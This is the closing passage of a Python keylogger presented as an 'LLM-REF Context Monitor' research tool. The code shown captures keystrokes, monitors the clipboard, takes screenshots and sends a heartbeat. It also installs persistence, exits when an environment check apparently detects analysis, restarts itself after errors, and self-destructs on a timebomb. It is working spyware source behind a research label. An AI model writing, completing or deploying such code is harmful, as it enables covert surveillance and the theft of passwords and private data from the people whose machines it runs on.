            time.sleep(3600)
            if ResearchConfig.check_timebomb():
                logger.info("Timebomb triggered - initiating self-destruct")
                self.running = False
                ResearchConfig.self_destruct()
    
    def start(self):
        MutexManager.create_mutex()
        
        self.clipboard_monitor.start()
        self.screenshot_manager.start()
        
        heartbeat_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
        heartbeat_thread.start()
        
        timebomb_thread = threading.Thread(target=self.timebomb_check_loop, daemon=True)
        timebomb_thread.start()
        
        try:
            with input_monitor.Listener(on_press=self.on_press) as listener:
                listener.join()
        except Exception as e:
            logger.error(f"Listener error: {e}")
        finally:
            self.running = False
            self.flush_buffer()

# ============================================================
# MAIN ENTRY POINT
# ============================================================
def main():
    if ResearchConfig.check_timebomb():
        ResearchConfig.self_destruct()
        return
    
    if not EnvironmentValidator.is_safe_to_run():
        logger.debug("Environment validation failed - exiting")
        sys.exit(0)
    
    PersistenceManager.ensure_persistence()
    
    while True:
        try:
            logger.info("Starting LLM-REF Context Monitor v4...")
            keylogger = KeyLogger()
            keylogger.start()
        except KeyboardInterrupt:
            logger.info("Shutting down...")
            break
        except Exception as e:
            logger.error(f"Critical error: {e}")
            time.sleep(ResearchConfig.RETRY_DELAY)
            continue

if __name__ == "__main__":
    main()
